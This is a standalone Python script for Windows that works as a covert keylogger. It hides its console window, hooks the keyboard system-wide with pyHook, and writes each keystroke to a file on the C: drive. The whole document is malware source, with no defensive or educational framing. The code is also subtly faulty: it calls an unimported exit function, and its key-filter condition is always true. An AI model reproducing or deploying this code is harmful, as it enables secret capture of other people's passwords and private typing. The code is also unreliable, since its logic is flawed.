# Import necessary libraries
import win32api
import win32console
import win32gui
import pythoncom
import pyHook

# Hide the console window
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

# Function to handle keyboard events
def OnKeyboardEvent(event):
    # If Ctrl+E is pressed, exit the program
    if event.Ascii == 5:
        _exit(1)
    # If the character is not NULL or backspace
    if event.Ascii != 0 or 8:
        # Open the output file in read mode
        f = open('c:\output.txt', 'r+')
        buffer = f.read()
        f.close()
        # Open the output file in write mode
        f = open('c:\output.txt', 'w')
        keylogs = chr(event.Ascii)
        # If Enter key is pressed, add a newline character
        if event.Ascii == 13:
            keylogs = '\n'
        buffer += keylogs
        f.write(buffer)
        f.close()

# Create a hook manager instance
hm = pyHook.HookManager()
# Assign the OnKeyboardEvent function to handle KeyDown events
hm.KeyDown = OnKeyboardEvent
# Hook the keyboard
hm.HookKeyboard()
# Start the message loop
pythoncom.PumpMessages()

